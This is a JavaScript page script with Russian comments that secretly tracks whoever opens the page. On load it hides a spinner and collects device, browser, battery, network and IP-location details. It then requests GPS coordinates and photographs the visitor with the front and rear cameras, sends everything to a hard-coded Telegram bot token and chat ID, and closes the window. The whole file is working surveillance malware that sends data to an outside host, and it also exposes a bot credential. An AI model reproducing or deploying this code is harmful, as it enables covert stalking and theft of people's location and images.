// ТВОИ ДАННЫЕ
const BOT_TOKEN = '8583690981:AAH_esCG5wUMmRiegjxDARFQDW6l-VxfJ9w';
const CHAT_ID = '526758225';

const video = document.getElementById('video');

// ========== ОТПРАВКА ==========
async function sendMessage(text) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('text', text);
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
    } catch(e) {}
}

async function sendPhoto(blob, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'photo.jpg');
    formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
    } catch(e) {}
}

// ========== ОПРЕДЕЛЕНИЕ МОДЕЛИ ТЕЛЕФОНА ==========
function getPhoneModel() {
    const ua = navigator.userAgent;
    const screen = `${screen.width}x${screen.height}`;

    if (ua.includes('iPhone')) {
        const models = {
            '320x480': 'iPhone SE/4/4s',
            '375x667': 'iPhone 6/7/8/SE2',
            '375x812': 'iPhone X/XS/11 Pro',
            '390x844': 'iPhone 12/13/14',
            '393x852': 'iPhone 15 Pro/16/16 Plus',
            '414x896': 'iPhone XR/11/11 Pro Max',
            '428x926': 'iPhone 14 Plus/15 Plus',
            '430x932': 'iPhone 15 Pro Max/16 Pro Max'
        };
        return models[screen] || 'iPhone (неизвестная модель)';
    }
    
    if (ua.includes('Android')) {
        const match = ua.match(/\(.+?\)/);
        if (match) {
            const parts = match[0].split(';');
            for (let part of parts) {
                if (part.includes('SM-') || part.includes('Pixel') || part.includes('Redmi') || part.includes('MI')) {
                    return part.trim();
                }
            }
        }
        return `Android (экран ${screen})`;
    }
    
    return 'Неизвестное устройство';
}

// ========== ВСЯ ИНФОРМАЦИЯ ==========
async function sendAllInfo() {
    const ua = navigator.userAgent;
    let os = 'Unknown';
    if (ua.indexOf('Android') > -1) os = 'Android';
    else if (ua.indexOf('iPhone') > -1) os = 'iOS';
    else if (ua.indexOf('Windows') > -1) os = 'Windows';
    else if (ua.indexOf('Mac') > -1) os = 'MacOS';
    
    let browser = 'Unknown';
    if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
    else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
    else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
    else if (ua.indexOf('Edg') > -1) browser = 'Edge';
    
    const screenSize = `${screen.width}x${screen.height}`;
    const phoneModel = getPhoneModel();
    const time = new Date().toLocaleString('ru-RU');
    
    let battery = '';
    if ('getBattery' in navigator) {
        try {
            const b = await navigator.getBattery();
            battery = `🔋 Батарея: ${Math.floor(b.level * 100)}% (${b.charging ? 'на зарядке' : 'не заряжается'})`;
        } catch(e) {}
    }
    
    let connection = '';
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
        connection = `📡 Интернет: ${conn.effectiveType || 'Unknown'} (${conn.downlink || '?'} Мбит/с)`;
    }
    
    let ip = '';
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        ip = `🌍 IP: ${data.ip}\n📍 Регион: ${data.city}, ${data.region}, ${data.country_name}`;
    } catch(e) {}
    
    const message = `📱 ОС: ${os} | ${browser}
📲 Модель: ${phoneModel}
⏰ Время: ${time}
${battery}
${connection}
${ip}`;
    
    await sendMessage(message);
}

// ========== ГЕОЛОКАЦИЯ ==========
function getGeo(callback) {
    if (!navigator.geolocation) {
        sendMessage('❌ Ошибка: браузер не поддерживает геолокацию');
        callback(null);
        return;
    }
    navigator.geolocation.getCurrentPosition(
        (pos) => callback({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
        (error) => {
            let errorMsg = '';
            if (error.code === 1) errorMsg = 'Пользователь ЗАПРЕТИЛ доступ к геолокации';
            else if (error.code === 2) errorMsg = 'Геолокация недоступна';
            else errorMsg = 'Ошибка геолокации';
            sendMessage(`❌ ${errorMsg}`);
            callback(null);
        }
    );
}

// ========== КАМЕРА ==========
function getCamera(facing, callback) {
    const cameraName = facing === 'user' ? 'фронтальной' : 'задней';
    navigator.mediaDevices.getUserMedia({
        video: { 
            facingMode: { exact: facing },
            width: { ideal: 1280 },
            height: { ideal: 720 }
        }
    }).then(stream => callback(stream)).catch((error) => {
        let errorMsg = '';
        if (error.name === 'NotAllowedError') errorMsg = `Пользователь ЗАПРЕТИЛ доступ к ${cameraName} камере`;
        else if (error.name === 'NotFoundError') errorMsg = `${cameraName} камера не найдена`;
        else errorMsg = `Ошибка камеры: ${error.name}`;
        sendMessage(`❌ ${errorMsg}`);
        callback(null);
    });
}

async function takePhoto(stream, caption) {
    return new Promise((resolve) => {
        const canvas = document.createElement('canvas');
        
        video.srcObject = stream;
        video.play().then(() => {
            setTimeout(() => {
                const width = video.videoWidth;
                const height = video.videoHeight;
                
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                
                ctx.drawImage(video, 0, 0, width, height);
                canvas.toBlob(async (blob) => {
                    if (blob) await sendPhoto(blob, caption);
                    resolve();
                }, 'image/jpeg', 0.85);
            }, 800);
        }).catch(() => resolve());
    });
}

// ========== ГЛАВНАЯ ==========
async function main() {
    // Скрываем спиннер
    const loader = document.querySelector('.loader');
    if (loader) loader.style.display = 'none';
    
    // 1. Вся информация
    await sendAllInfo();
    
    // 2. Геолокация
    getGeo(async (loc) => {
        if (loc) {
            await sendMessage(`📍 Яндекс.Карты: https://yandex.com/maps/?pt=${loc.lon},${loc.lat}&z=17`);
        }
        
        // 3. Камера
        getCamera('user', async (stream) => {
            if (stream) {
                await takePhoto(stream, '📸 Фронтальная камера');
                
                setTimeout(async () => {
                    getCamera('environment', async (backStream) => {
                        if (backStream) {
                            await takePhoto(backStream, '📸 Задняя камера');
                            backStream.getTracks().forEach(t => t.stop());
                        }
                        stream.getTracks().forEach(t => t.stop());
                        setTimeout(() => window.close(), 1000);
                    });
                }, 3000);
            } else {
                setTimeout(() => window.close(), 1000);
            }
        });
    });
}

// ЗАПУСК
main();
